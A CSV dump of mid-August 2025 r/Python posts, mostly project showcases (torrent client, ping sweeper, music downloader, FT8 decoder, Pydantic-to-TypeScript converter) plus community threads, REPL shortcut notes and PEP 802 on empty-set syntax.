1mqiucj,Anyone using VSCode and Behave (BDD/Cucumber) test framework?,jghaines,4,3,2025-08-15 00:50:47,https://www.reddit.com/r/Python/comments/1mqiucj/anyone_using_vscode_and_behave_bddcucumber_test/,"I'm using the [behave](https://github.com/behave/behave) framework to write [cucumber](http://cucumber.io)\-style BDD tests in Gherkin.

There are a handful of VSCode community extensions that support behave, but they are janky and not well maintained. [Behave VSC](https://marketplace.visualstudio.com/items?itemName=jimasp.behave-vsc) is useable, but has minor conflicts with the standard python extension.

I've raised an issue [Support for ""behave"" (or arbitrary) test framework](https://github.com/microsoft/vscode-python/issues/25330) on the [microsoft](https://github.com/microsoft)/[vscode-python](https://github.com/microsoft/vscode-python) GitHub repo for better support. If anyone would also benefit from this, please throw an upvote on the issue."
1mqhp24,Friday Daily Thread: r/Python Meta and Free-Talk Fridays,AutoModerator,4,0,2025-08-15 00:00:48,https://www.reddit.com/r/Python/comments/1mqhp24/friday_daily_thread_rpython_meta_and_freetalk/,"# Weekly Thread: Meta Discussions and Free Talk Friday üéôÔ∏è

Welcome to Free Talk Friday on /r/Python! This is the place to discuss the r/Python community (meta discussions), Python news, projects, or anything else Python-related!

## How it Works:

1. **Open Mic**: Share your thoughts, questions, or anything you'd like related to Python or the community.
2. **Community Pulse**: Discuss what you feel is working well or what could be improved in the /r/python community.
3. **News & Updates**: Keep up-to-date with the latest in Python and share any news you find interesting.

## Guidelines:

* All topics should be related to Python or the /r/python community.
* Be respectful and follow Reddit's [Code of Conduct](https://www.redditinc.com/policies/content-policy).

## Example Topics:

1. **New Python Release**: What do you think about the new features in Python 3.11?
2. **Community Events**: Any Python meetups or webinars coming up?
3. **Learning Resources**: Found a great Python tutorial? Share it here!
4. **Job Market**: How has Python impacted your career?
5. **Hot Takes**: Got a controversial Python opinion? Let's hear it!
6. **Community Ideas**: Something you'd like to see us do? tell us.

Let's keep the conversation going. Happy discussing! üåü"
1mqh3g5,Create Music with Wolframs Cellular Automata Rule 30!,Playful_Luck_5315,1,0,2025-08-14 23:35:40,https://www.reddit.com/r/Python/comments/1mqh3g5/create_music_with_wolframs_cellular_automata_rule/,"[https://github.com/oppressionslayer/RedditCode/blob/main/rule30\_to\_midi.py](https://github.com/oppressionslayer/RedditCode/blob/main/rule30_to_midi.py)

  
[https://github.com/oppressionslayer/RedditCode.git](https://github.com/oppressionslayer/RedditCode.git)"
1mqf3e6,We rewrote our ingest pipeline from Python to Go ‚Äî here‚Äôs what we learned,squadfi,0,25,2025-08-14 22:14:46,https://www.reddit.com/r/Python/comments/1mqf3e6/we_rewrote_our_ingest_pipeline_from_python_to_go/,"We built Telemetry Harbor, a time-series data platform, starting with Python FastAPI for speed of prototyping. It worked well for validation‚Ä¶ until performance became the bottleneck.

We were hitting 800% CPU spikes, crashes, and unpredictable behavior under load. After evaluating Rust vs Go, we chose Go for its balance of performance and development speed.

The results:
	‚Ä¢	10x efficiency improvement
	‚Ä¢	Stable CPU under heavy load (~60% vs Python‚Äôs 800% spikes)
	‚Ä¢	No more cascading failures
	‚Ä¢	Strict type safety catching data issues Python let through

Key lessons:
	1.	Prototype fast, but know when to rewrite.
	2.	Predictable performance matters as much as raw speed.
	3.	Strict typing prevents subtle data corruption.
	4.	Sometimes rejecting bad data is better than silently fixing it.

Full write-up with technical details

https://telemetryharbor.com/blog/from-python-to-go-why-we-rewrote-our-ingest-pipeline-at-telemetry-harbor/"
1mqej2w,Compiled Python Questions into a Quiz,Significant_Soup2558,5,6,2025-08-14 21:53:29,https://www.reddit.com/r/Python/comments/1mqej2w/compiled_python_questions_into_a_quiz/,"Compiled over 500 Python Questions into a quiz. It was a way to learn by creating the quiz and to practice instead of doom scrolling. If you come across a question whose answer you're unsure of, please let me know. Enjoy! [Python Quiz](https://applyre.com/resources/500-interview-questions/python/) "
1mq5r48,I built a terminal-based BitTorrent client in Python ‚Äî Torrcli,None,41,9,2025-08-14 16:37:29,https://www.reddit.com/r/Python/comments/1mq5r48/i_built_a_terminalbased_bittorrent_client_in/,"**Hey everyone,**  
I‚Äôve been working on a side project over the past few months and wanted to share it. It‚Äôs called **Torrcli** ‚Äî a fast, terminal-based BitTorrent client written in Python. My goal was to make something that‚Äôs both beautiful to use in the terminal and powerful under the hood.

  
**What My Project Does**

Torrcli lets you search, download, and manage torrents entirely from your terminal. It includes a built-in search feature for finding torrents without opening a browser, a basic stream mode so you can start watching while downloading, and full config file support so you can customize it to your needs. It also supports fast resume so you can pick up downloads exactly where you left off.

  
**Target Audience**

Torrcli is aimed at people who:

* Enjoy working in the terminal and want a clean, feature-rich BitTorrent client there.
* Run headless servers, seedboxes, or low-power devices where a GUI torrent client isn‚Äôt practical.
* Want a lightweight, configurable alternative to bloated torrent apps.

While it‚Äôs functional and usable right now, it‚Äôs still being polished ‚Äî so think of it as **early but solid** rather than fully production-hardened.

  
**Comparison to Existing Alternatives**

The market is dominated mostly by gui torrent clients and the few terminal-based torrent clients that exists are either minimal (fewer features) or complicated to set up. Torrcli tries to hit a sweet spot:

* **Looks better** in the terminal thanks to `rich` (colorful progress bars, neat layouts).
* **More integrated features** like search and stream mode, so you don‚Äôt need extra scripts or apps.
* **Cross-platform Python project**, making it easier to install and run anywhere Python works.

**Repo:** [https://github.com/aayushkdev/torrcli](https://github.com/aayushkdev/torrcli)

  
I‚Äôm still improving it, so I‚Äôd love to hear feedback, ideas, or suggestions. If you like the project, a star on GitHub would mean a lot!"
1mq38ht,LLMs love Python so much. It‚Äòs not necessarily a good thing.,wyhjsbyb,0,3,2025-08-14 15:05:23,https://www.reddit.com/r/Python/comments/1mq38ht/llms_love_python_so_much_its_not_necessarily_a/,"I just read an interesting [paper from KCL](https://arxiv.org/pdf/2503.17181). It said that LLMs used Python in 90% to 97% of benchmark programming tasks, even when other languages might have been a better fit.¬†

Is this serious bias a good thing or not? 

My thoughts are [here](https://medium.com/techtofreedom/ais-serious-python-bias-concerns-of-llms-preferring-one-language-2382abb3cac2?sk=2c4cb9428777a3947e37465ebcc4daae).

What do you think?"
1mq324g,Tasklin - A single CLI to experiment with multiple AI models,Severe-Wedding7305,0,2,2025-08-14 14:59:16,https://www.reddit.com/r/Python/comments/1mq324g/tasklin_a_single_cli_to_experiment_with_multiple/,"Yoo!

I made **Tasklin**, a Python CLI that makes it easy to work with AI models. Whether it‚Äôs OpenAI, Ollama, or others, Tasklin lets you send prompts, get responses, and use AI from one tool - no need to deal with a bunch of different CLIs.

# What My Project Does:

Tasklin lets you talk to different AI providers with the same commands. You get JSON responses with the output, tokens used, and how long it took. You can run commands one at a time or many at once, which makes it easy to use in scripts or pipelines.

# Target Audience:

This is for developers, AI fans, or anyone who wants a simple tool to try out AI models. It‚Äôs great for testing prompts, automating tasks, or putting AI into pipelines and scripts.

# Comparison:

Other CLIs only work with one AI provider. Tasklin works with many using the same commands. It also gives structured outputs, supports async commands, and is easy to plug into scripts and pipelines.

# Quick Examples:

**OpenAI:**

    tasklin --type openai --key YOUR_KEY --model gpt-4o-mini --prompt ""Write a short story about a robot""
    

**Ollama (local model):**

    tasklin --type ollama --base-url http://localhost:11434 --model codellama --prompt ""Explain recursion simply""
    

# Links:

* GitHub: [https://github.com/jetroni/tasklin](https://github.com/jetroni/tasklin)
* PyPI: [https://pypi.org/project/tasklin](https://pypi.org/project/tasklin)

Try it out, break it, play with it, and tell me what you think! Feedback, bugs, or ideas are always welcome."
1mptj7m,Tool that converts assembly code into Minecraft command blocks,bowser04410,60,7,2025-08-14 07:11:28,https://www.reddit.com/r/Python/comments/1mptj7m/tool_that_converts_assembly_code_into_minecraft/,"Tired of messy command block contraptions? I built a Python tool that converts assembly code into Minecraft command blocks and exports them as WorldEdit schematics.

It's the very start of the project and i need you for what i need to add

**Write this:**

    SET R0, #3
    SET R1, #6
    MUL R0, R1
    SAY ""3 * 6 = {R0}""

**Get working command blocks automatically!**

# Features

* Custom assembly language with registers (R0-R7)
* Arithmetic ops, flow control, functions with CALL/RET
* Direct .schem export for WorldEdit
* Stack management and conditional execution

**GitHub**: [Assembly-to-Minecraft-Command-Block-Compiler](https://github.com/Bowser04/Assembly-to-Minecraft-Command-Block-Compiler)

Still in development - feedback, suggestions or help are welcome!

The target audience is people interested in this project that may seem crazy or contributor 

*Yes, it's overkill. That's what makes it fun! üòÑ It's literally a command block computer*

For alternatives I don't know any but they must exist somewhere. So why me it's different because my end goal is a python to minecraft command block converter through a shematic"
1mplowa,Python 3.13 REPL keyboard mappings/shortcuts/bindings,gabrielsroka,18,15,2025-08-14 00:31:08,https://www.reddit.com/r/Python/comments/1mplowa/python_313_repl_keyboard_mappingsshortcutsbindings/,"I couldn't find a comprehensive list of keyboard shortcuts for the new REPL, so here's the source code:

[https://github.com/python/cpython/blob/3.13/Lib/\_pyrepl/reader.py#L66-L131](https://github.com/python/cpython/blob/3.13/Lib/_pyrepl/reader.py#L66-L131)

\\C means Ctrl, \\M means meta (Alt key on Windows/Linux, Option\[?\] on mac).

Of particular interest, on the Windows 10 Terminal, pressing **Ctrl+Alt+Enter** while editing a block of code will ""accept"" (**run**) it¬†without having to go to the end of the last line and pressing Enter twice. (Alt+Enter on Windows switches to/from full screen mode). on Ubuntu, it's Alt+Enter. i don't have a mac to test on -- if you do, let me know in the comments below.

Other related/interesting links:

[https://treyhunner.com/2024/10/adding-keyboard-shortcuts-to-the-python-repl/](https://treyhunner.com/2024/10/adding-keyboard-shortcuts-to-the-python-repl/)

[https://www.youtube.com/watch?v=dK6HGcSb60Y](https://www.youtube.com/watch?v=dK6HGcSb60Y)

|Keys|Command|
|:-|:-|
|Ctrl+a|beginning-of-line|
|Ctrl+b|left|
|Ctrl+c|interrupt|
|Ctrl+d|delete|
|Ctrl+e|end-of-line|
|Ctrl+f|right|
|Ctrl+g|cancel|
|Ctrl+h|backspace|
|Ctrl+j|accept|
|Ctrl+k|kill-line|
|Ctrl+l|clear-screen|
|Ctrl+m|accept|
|Ctrl+t|transpose-characters|
|Ctrl+u|unix-line-discard|
|Ctrl+w|unix-word-rubout|
|Ctrl+x Ctrl+u|upcase-region|
|Ctrl+y|yank|
|Ctrl+z|suspend|
|Alt+b|backward-word|
|Alt+c|capitalize-word|
|Alt+d|kill-word|
|Alt+f|forward-word|
|Alt+l|downcase-word|
|Alt+t|transpose-words|
|Alt+u|upcase-word|
|Alt+y|yank-pop|
|Alt+-|digit-arg|
|Alt+0|digit-arg|
|Alt+1|digit-arg|
|Alt+2|digit-arg|
|Alt+3|digit-arg|
|Alt+4|digit-arg|
|Alt+5|digit-arg|
|Alt+6|digit-arg|
|Alt+7|digit-arg|
|Alt+8|digit-arg|
|Alt+9|digit-arg|
|Alt+\\n|accept|
|Esc \[200\~|enable\_bracketed\_paste|
|Esc \[201\~|disable\_bracketed\_paste|
|Ctrl+<left>|backward-word|
|Ctrl+<right>|forward-word|
|Esc \[3\~|delete|
|Alt+<backspace>|backward-kill-word|
|<end>|end-of-line|
|<home>|beginning-of-line|
|<f1>|help|
|<f2>|show-history|
|<f3>|paste-mode|
|Esc OF|end|
|Esc OH|home|

search history: [https://github.com/python/cpython/blob/3.13/Lib/\_pyrepl/historical\_reader.py#L33-L47](https://github.com/python/cpython/blob/3.13/Lib/_pyrepl/historical_reader.py#L33-L47)

keywords: pyrepl, \_pyrepl, pypy repl"
1mpkzoc,"Thursday Daily Thread: Python Careers, Courses, and Furthering Education!",AutoModerator,3,0,2025-08-14 00:00:32,https://www.reddit.com/r/Python/comments/1mpkzoc/thursday_daily_thread_python_careers_courses_and/,"# Weekly Thread: Professional Use, Jobs, and Education üè¢

Welcome to this week's discussion on Python in the professional world! This is your spot to talk about job hunting, career growth, and educational resources in Python. Please note, this thread is **not for recruitment**.

---

## How it Works:

1. **Career Talk**: Discuss using Python in your job, or the job market for Python roles.
2. **Education Q&A**: Ask or answer questions about Python courses, certifications, and educational resources.
3. **Workplace Chat**: Share your experiences, challenges, or success stories about using Python professionally.

---

## Guidelines:

- This thread is **not for recruitment**. For job postings, please see r/PythonJobs or the recruitment thread in the sidebar.
- Keep discussions relevant to Python in the professional and educational context.
  
---

## Example Topics:

1. **Career Paths**: What kinds of roles are out there for Python developers?
2. **Certifications**: Are Python certifications worth it?
3. **Course Recommendations**: Any good advanced Python courses to recommend?
4. **Workplace Tools**: What Python libraries are indispensable in your professional work?
5. **Interview Tips**: What types of Python questions are commonly asked in interviews?

---

Let's help each other grow in our careers and education. Happy discussing! üåü"
1mpeugb,Execute Python Scripts via BLE using your mobile phone,bleuio,2,0,2025-08-13 19:57:47,https://www.reddit.com/r/Python/comments/1mpeugb/execute_python_scripts_via_ble_using_your_mobile/,"This project demonstrates how to execute a Python script wirelessly from your mobile phone through the BLE¬†**Serial Port Service (SPS)**.¬†Full details of the project and source code available at   
[https://www.bleuio.com/blog/execute-python-scripts-via-ble-using-bleuio-and-your-mobile-phone/](https://www.bleuio.com/blog/execute-python-scripts-via-ble-using-bleuio-and-your-mobile-phone/)"
1mperw4,"Astral's first paid offering announced - pyx, a private package registry and pypi frontend",tomster10010,303,71,2025-08-13 19:55:10,https://www.reddit.com/r/Python/comments/1mperw4/astrals_first_paid_offering_announced_pyx_a/,"https://astral.sh/pyx

https://x.com/charliermarsh/status/1955695947716985241

Looks like this is how they're going to try to make a profit? Seems pretty not evil, though I haven't had the problems they're solving. 

edit: to be clear, not affiliated"
1mpdlvv,Made a CLI tool - pingsweeper,jzmack,3,10,2025-08-13 19:11:11,https://www.reddit.com/r/Python/comments/1mpdlvv/made_a_cli_tool_pingsweeper/,"Hello all, I've been slowly iterating on this project for close to a year and it feels like it's time to share.

https://github.com/jzmack/pingsweeper

## What my project does

It's a way to quickly send pings to every IP address on a network so you can tell which IPs respond to a ping. Results can be output in plain text, CSV, or JSON.

## Target Audience

This tool is mainly targeted for Network Engineers and System Administrators, but can be used by anyone for IP address allocation planning and network monitoring.

## Comparisons

Similar to nmap but only sends ICMP packets.
"
1mp7nd1,Potty - A CLI tool to download Spotify and youtube music using yt-dlp,Punk_Saint,10,21,2025-08-13 15:31:48,https://www.reddit.com/r/Python/comments/1mp7nd1/potty_a_cli_tool_to_download_spotify_and_youtube/,"Hey everyone!   
  
I just released **Potty**, my new Python-based command-line tool for downloading and managing music from Spotify & YouTube using **yt-dlp**.

This project started because I was frustrated with spotify and I wanted to self-host my own music, and it evolved to wanting to better manage my library, embed metadata, and keep track of what I‚Äôd already downloaded.   
  
Some tools worked for YouTube but not Spotify. Others didn‚Äôt organize my library or let me clean up broken files or schedule automated downloads. So, I decided to build my own solution, and it grew into something much bigger.

# üéØ What Potty Does

* **Interactive CLI menus** for downloading, managing, and automating your music library
* **Spotify data integration**: use your exported `YourLibrary.json` to generate tracklists
* **Download by artist & song name** or batch-download entire lists
* **YouTube playlist & link support** with direct audio extraction
* **Metadata embedding** for downloaded tracks (artist, album, artwork, etc.)
* **System resource checks** before starting downloads (CPU, RAM, storage)
* **Retry manager** for failed downloads
* **Duplicate detection & file organization**
* **Export library data** to JSON
* **Clean up** broken or unreadable tracks
* **Audio format & bitrate selection** for quality control

# üë• Target Audience

Potty is for **data-hoarders**, **music lovers, playlist curators, and automation nerds** who want a single, reliable tool to:

* Manage both Spotify and YouTube music sources
* Keep their library clean, organized, and well-tagged
* Automate downloads without babysitting multiple programs

# üîç Comparison

Other tools like **yt-dlp** handle the download part well, but Potty:

* Adds **interactive menus** to streamline usage
* Integrates **Spotify library exports**
* Handles **metadata embedding**, **library cleanup**, **automation**, and **organization** all in one From what I could find, there‚Äôs no other tool that combines all of these in a modular, Python-based CLI.

üì¶ **GitHub:** [https://github.com/Ssenseii/spotify-yt-dlp-downloader](https://github.com/Ssenseii/spotify-yt-dlp-downloader)  
üìÑ **Docs:** readme so far, but coming soon

I‚Äôd love feedback, especially if you‚Äôve got feature ideas or spot any rough edges or better name ideas."
1mp4w8k,FT8Decoder - A Library for the Parsing and Enrichment of FT8 Radio Messages,rabidmonkeyz54,28,10,2025-08-13 13:45:12,https://www.reddit.com/r/Python/comments/1mp4w8k/ft8decoder_a_library_for_the_parsing_and/,"Hey everyone! I just released my first Python package, [FT8Decoder](https://pypi.org/project/ft8decoder/).

Earlier this summer I got into amateur radio as a hobby and stumbled across [FT8 transmissions](https://www.youtube.com/watch?v=qInOSHfT8jA) while exploring WebSDR. I was intrigued by the spooky alien sounding tones and wanted to know what they meant. I installed WSJT-X, which decodes them in real time, but as a newcomer, ‚ÄúCQ ABDCE FN41‚Äù or ‚ÄúKWB8R KCQ4N R-08‚Äù didn‚Äôt really give me the clarity I was looking for.

So, I went looking for a Python library that could translate these into readable messages in a fun little script. I couldn‚Äôt find one, so I decided to build one myself. From there my little library grew into a full FT8 logging and enrichment tool.

**What my Project Does:**

* Parses WSJT-X UDP packets into clean Python objects
* Classifies all FT8 message types (CQ calls, QSOs, signal reports, acknowledgments, etc.)
* Tracks and organizes the state of every FT8 QSO from CQ to 73
* Translates messages such as ""KWB8R KCQ4N R-08"" into readable text: ""KCQ4N says Roger and reports a signal report of -08 to KWB8R.""
* Enriches data with frequency offset, MHz conversion, band detection, and more
* Performs Grid square lookups with lat/lon output and interactive map support (Folium)
* Exports organized FT8 data to JSON for easy integration into other tools
* Offers a light CLI interface for easy use

**Target Audience:**

This is a tool for ham radio hobbyists, researchers, or developers! It's also useful for anyone looking to understand how FT8 communications are structured and gain a deeper understanding of FT8 as a whole.

**Comparison:**

From what I could find, there isn't really a direct comparison to this project. While there are a few other FT8 PyPi libraries out there, they are mostly in the neighborhood of signal processing and working with raw audio, while FT8Decoder is more of a post-processing tool that works with already decoded messages.

You can easily install ft8decoder by running \`pip install ft8decoder\`

PyPi: [https://pypi.org/project/ft8decoder/](https://pypi.org/project/ft8decoder/)

Docs: [https://zappathehackka.github.io/ft8decoder/](https://zappathehackka.github.io/ft8decoder/)

Source: [https://github.com/ZappatheHackka/ft8decoder](https://github.com/ZappatheHackka/ft8decoder)

Would love any feedback anyone has to share. Wondering if ""FT8Logger"" or something similar would be a better name for this.

Thank you! :)"
1movwtt,How Python Is Powering the Next Wave of Data Freelancing & AI Work,Pangaeax_,0,2,2025-08-13 05:27:19,https://www.reddit.com/r/Python/comments/1movwtt/how_python_is_powering_the_next_wave_of_data/,"Python has long been the go-to language for data analytics, machine learning, and automation. But there‚Äôs a noticeable trend emerging in 2025, Python skills are becoming one of the most in-demand assets in the freelance economy, especially in the data and AI sector.

Some key trends I‚Äôm seeing:

* **AI-assisted data analytics workflows** \- Python libraries like PandasAI and LangChain are helping analysts go from raw data to insights faster than ever.
* **Freelance demand surge** \- More businesses are moving away from full-time hires to contract-based Python talent for specialized ML and analytics projects.
* **Cross-platform integration** \- Python scripts are increasingly being deployed in serverless environments, making it easier for small teams to scale data solutions.
* **Real-time analytics** \- Frameworks like FastAPI + WebSockets are enabling live dashboards for client deliverables.

What‚Äôs interesting is that this isn‚Äôt just about coders anymore, data analysts who can write Python are often commanding higher rates than generalist developers.

For those freelancing or hiring in data/AI, where do you see Python‚Äôs role heading next? Are we moving toward fully AI-assisted analytics, or will human Python expertise remain essential?"
1movsu6,"I created a wrapper for google drive, google calendars, google tasks and gmail",Stunning_Television9,63,6,2025-08-13 05:20:45,https://www.reddit.com/r/Python/comments/1movsu6/i_created_a_wrapper_for_google_drive_google/,"GitHub: [https://github.com/dsmolla/google-api-client-wrapper](https://github.com/dsmolla/google-api-client-wrapper)

PyPI: [https://pypi.org/project/google-api-client-wrapper/](https://pypi.org/project/google-api-client-wrapper/)

**What my project does:**

Hey, I made a simple, and easy to use API wrapper for some of Google's services. I'm working on a project where I need to use google's apis and I ended up building this wrapper around it and wanted to share it here in case anyone is in the same boat and don't want to spend time trying to figure out the official API.

**Target Audience**

This is for developers who are working on a project that uses Google's APIs and are looking for easy to understand wrappers

**Comparison**

* Data Models like EmailMessage, Event, DriveFolder, Task vs. Raw API responses
* Helper Methods
* Built-in support for multiple accounts
* Query builders vs. Manually writing raw queries
* Clear documentation and Easy to navigate
* Similar patterns in all services

  
I will add async support soon especially for batch operations"
1moqu1g,Polynomial real root finder (First real python project),MoatazProAtAll,29,23,2025-08-13 01:11:01,https://www.reddit.com/r/Python/comments/1moqu1g/polynomial_real_root_finder_first_real_python/,"[https://github.com/MizoWNA/Polynomial-root-finder](https://github.com/MizoWNA/Polynomial-root-finder)

**What My Project Does**

Hello! I wanted to show off my first actual python project, a simple polynomial root finder using Sturms's theorem, bisection method, and newton's method. A lot of it is very basic code, but I thought it was worth sharing nonetheless.

**Target Audience**

It's meant to be just a basic playground to test out what I've been learning, updated every so often since I dont actually major in any CS related degrees.

**Comparison**

As to how it compares to everything else in its field? It doesn't."
1mojgpf,I'm creating pythonsaga.dev - A python fantasy learning companion. What do you think?,Wonderful_Fly_979,1,0,2025-08-12 20:08:26,https://www.reddit.com/r/Python/comments/1mojgpf/im_creating_pythonsagadev_a_python_fantasy/,"Hi,

Please close if not allowed.

I'm currently developing a website/app called pythonsaga.dev which looks at doing basic python tasks set in a fantasy setting, with themes levels and game like elements.

The lessons are guided and expect a basic knowledge on python with the ambition to practice your skills whilst following a structured course like py4e.

The main part of the website is behind login credentials in the coding adventure guide so you can maintain your progress through levels.

It's still early in development with bugs. But would love your feedback on what you'd expect to be done better.

Thanks!"
1moghs4,pyflowkit-pipeline in one command,One_Drink_2075,0,3,2025-08-12 18:19:19,https://www.reddit.com/r/Python/comments/1moghs4/pyflowkitpipeline_in_one_command/,"**üöÄ I built PyFlowKit ‚Äî Create AI workflows in 3 commands**

Tired of writing the same boilerplate for RAGs, chatbots, or AI pipelines? **PyFlowKit** is a CLI-first tool where you define workflows in TOML and run them instantly ‚Äî with automatic dependency resolution, caching, and ready-made templates.

    bashCopyEditpip install pyflowkit
    pyflow new my-rag --template rag
    pyflow run
    

**Features:**

* Chain CSV/API ‚Üí LLM ‚Üí vector DB ‚Üí web UI
* Built-in steps: CSV, OpenAI, Chroma, Gradio, API fetch
* Smart DAG execution with DuckDB caching
* Templates for RAG, ML training, data processing
* Plugin system for custom steps

**Example:**

    tomlCopyEdit[[steps]]
    id = ""embed_docs""
    type = ""openai_prompt""
    depends_on = [""load_docs""]
    config = { model = ""text-embedding-ada-002"", input_column = ""content"" }
    

**GitHub:** [github.com/Sambhram1/PY-FLOWKIT](https://github.com/Sambhram1/PY-FLOWKIT)

It‚Äôs like Airflow/Prefect, but local-first and focused on rapid AI prototyping. Feedback welcome!"
1moe4w2,I made a trackpad using python for pc/laptop. Check it out on my channel. #meteorplays,fifafifhttfafa3039,0,0,2025-08-12 16:53:51,https://www.reddit.com/r/Python/comments/1moe4w2/i_made_a_trackpad_using_python_for_pclaptop_check/,"Channel name- Meteorplays 

I made a trackpad using python for pc/laptop. Check it out on my channel. #meteorplays

Vid- turn your mobile into a wireless trackpad.
#code,.......................................................
.
.
.
.
.
 . .   . .   .       . "
1modnfw,Bug in Python 3.13 wave module? getnchannels() error on cleanup.,Common_Base657,0,7,2025-08-12 16:36:08,https://www.reddit.com/r/Python/comments/1modnfw/bug_in_python_313_wave_module_getnchannels_error/,"Hey everyone,

I ran into a really strange error today while working with the built-in wave module in **Python 3.13** and thought I'd share in case anyone else encounters this or has some insight.

I was trying to do something very basic: generate a simple sine wave and save it as a WAV file using the standard library. My code was the textbook example, using wave.open() inside a with statement to handle the file.

The weird part is that my script runs, but then throws this error right at the end, seemingly during the internal cleanup process after the with block closes the file:

`wave.Error: # channels not specified`

My code to set the channels `(wav_file.setnchannels(1))` is definitely there and in the correct order before writing the frames, so it doesn't seem to be a problem with my script's logic. It feels like the library is failing internally when the file object is being destroyed.

Has anyone else seen this with Python 3.13? Is this a known bug in the new version?

Thanks!"
1moa8dx,Subsets of dictionaries should be accessible through multi-key bracket notation.,jam-time,0,13,2025-08-12 14:27:47,https://www.reddit.com/r/Python/comments/1moa8dx/subsets_of_dictionaries_should_be_accessible/,"Interested to hear other people's opinions, but I think you should be able to do something like this:

    foo = {'a': 1, 'b': 2, 'c': 3}
    foo['a', 'c'] == {'a': 1, 'c': 3}  # True
    # or
    keys = ['a', 'c']
    foo[*keys] == {'a': 1, 'c': 3}  # True

I know it could cause problems with situations where you have a tuple as a key, but it could search for the tuple first, then the individual elements.

I find myself wanting this functionality regularly enough that it feels like it should work this way already.

Any thoughts?

EDIT:

I know this can be accomplished through a basic comprehension,  dict subclass, wrapper class, helper function, etc. There are a lot of ways to get the same result. It just feels like this is how it should work by default, but it seems like people disagree ü§∑"
1mo8ypj,"structlog-journald, attach extra info to jogs and filter logs by it",bachkhois,6,1,2025-08-12 13:37:18,https://www.reddit.com/r/Python/comments/1mo8ypj/structlogjournald_attach_extra_info_to_jogs_and/,"- What my project does: In a multi-tenant system, logs from various tenants are often mixed, making difficult to debug. This library bridges structlog and journald, to allow to attach extra info (like tenant ID) when writing logs. When we view logs via journalctl, we can filter by that tenant ID.
- Target audience: Python developers who often debug a system of many concurent operations running.
- Source code: https://github.com/hongquan/structlog-journald
- Manual: https://structlog-journald.readthedocs.io/en/latest/advanced.html"
1mo708p,Interview Experience,Desperate-Aerie-286,0,12,2025-08-12 12:12:07,https://www.reddit.com/r/Python/comments/1mo708p/interview_experience/,"Feels ironic how an interviewer rejected me because I didn't knew the difference between == and is operator in Python . But knows how to create APIs, websockets doing encryption and handling two live projects. "
1mo5s7f,Applying Prioritized Experience Replay in the PPO algorithm,NoteDancing,3,0,2025-08-12 11:11:01,https://www.reddit.com/r/Python/comments/1mo5s7f/applying_prioritized_experience_replay_in_the_ppo/,"# What My Project Does

This RL class implements a flexible, research-friendly training loop that brings **prioritized experience replay (PER)** into Proximal Policy Optimization (PPO) workflows. It supports on- and off-policy components (PPO, HER, MARL, IRL), multi-process data collection, and several replay strategies (standard uniform, PER, and HER), plus conveniences like noise injection, policy wrappers, saving/checkpointing, and configurable training schedulers. Key features include per-process experience pools, a pluggable priority scoring function (TD / ratio hybrid), ESS-driven windowing to control buffer truncation, and seamless switching between batch- and step-based updates ‚Äî all designed so you can experiment quickly with novel sampling and scheduling strategies.

# Target Audience

This project is aimed at researchers and engineers who need a compact but powerful sandbox for RL experiments:

* Academic researchers exploring sampling strategies, PER variants, or hybrid on-/off-policy training.
* Graduate students and ML practitioners prototyping custom reward/priority schemes (IRL, HER, prioritized PPO).
* Engineers building custom agents where existing high-level libraries are too rigid and you need fine-grained control over buffering, multiprocessing, and update scheduling.

# Comparison

Compared with large, production-grade RL frameworks (e.g., those focused on turnkey agents or distributed training), this RL class trades out-of-the-box polish for **modularity and transparency**: every component (policy, noise, prioritized replay, window schedulers) is easy to inspect, replace, or instrument. Versus simpler baseline scripts, it adds robust features you usually want for reproducible research ‚Äî multi-process collection, PER + PPO integration, ESS-based buffer control, and hooks for saving/monitoring. In short: use this if you want a lightweight, extensible codebase to test new ideas and sampling strategies quickly; use heavier frameworks when you need large-scale production deployment, managed cluster orchestration, or many pre-built algorithm variants.

  
[https://github.com/NoteDance/Note\_rl](https://github.com/NoteDance/Note_rl)"
1mo20uc,I built a tiny tool to convert Pydantic models to TypeScript. What do you think?,TheFitDev,39,18,2025-08-12 07:17:17,https://www.reddit.com/r/Python/comments/1mo20uc/i_built_a_tiny_tool_to_convert_pydantic_models_to/,"At work we use FastAPI and Next.js, and I often need to¬†turn Pydantic models into TypeScript for the frontend. Doing it by hand every time was boring, slow, and easy to mess up so¬†I built a small app to do it for me.

* Paste your Pydantic models/enums, get clean TypeScript interfaces/types instantly.
* Runs¬†100% in your browser (no server, no data saved)
* One-click¬†copy or download a¬†.ts¬†file

# What My Project Does

My project is a simple website that converts your Python Pydantic models into clean TypeScript code. You just paste your Pydantic code, and it instantly gives you the TypeScript version. It all happens right in your browser, so your code is safe and never saved. This saves you from having to manually type out all the interfaces, which is boring and easy to mess up.

# Target Audience

This is for developers who use FastAPI on the backend and TypeScript (with frameworks like Next.js or React) on the frontend. It's a professional tool meant to be used in real projects to keep the backend and frontend in sync.

# Comparison

There are other tools out there, but they usually require you to install them and use your computer's command line. My tool is different because it's a website. You don't have to install anything, which makes it super quick and easy to use for a fast conversion. Plus, because it runs in your browser, you know your code is private.

It‚Äôs saved me a bunch of time and keeps backend¬†and frontend in sync. If you do the same stack or use typescript, you might¬†find it handy too.  
Github: [https://github.com/sushpawar001/pydantic-typescript-converter](https://github.com/sushpawar001/pydantic-typescript-converter)  
Check it out:¬†[https://pydantic-typescript-converter.vercel.app/](https://pydantic-typescript-converter.vercel.app/)  
Would love feedback and ideas!

PS: Not gonna lie I have significantly used AI to build this. (Not vibe coded though)"
1mnuan1,PEP 802 ‚Äì Display Syntax for the Empty Set,kirara0048,209,269,2025-08-12 00:36:16,https://www.reddit.com/r/Python/comments/1mnuan1/pep_802_display_syntax_for_the_empty_set/,"PEP 802 ‚Äì Display Syntax for the Empty Set  
[https://peps.python.org/pep-0802/](https://peps.python.org/pep-0802/)

# [Abstract](https://peps.python.org/pep-0802/#abstract)

We propose a new notation,¬†`{/}`, to construct and represent the empty set. This is modelled after the corresponding mathematical symbol ‚Äò‚àÖ‚Äô.

This complements the existing notation for empty tuples, lists, and dictionaries, which use¬†`()`,¬†`[]`, and¬†`{}`¬†respectively.

    >>> type({/})
    <class 'set'>
    >>> {/} == set()
    True

# [Motivation](https://peps.python.org/pep-0802/#motivation)

Sets are currently the only built-in collection type that have a¬†[display syntax](https://docs.python.org/3/reference/expressions.html#comprehensions), but no notation to express an empty collection. The¬†[Python Language Reference](https://docs.python.org/3/reference/expressions.html#set)¬†notes this, stating:

>An empty set cannot be constructed with¬†`{}`; this literal constructs an empty dictionary.

This can be confusing for beginners, especially those coming to the language from a scientific or mathematical background, where sets may be in more common use than dictionaries or maps.

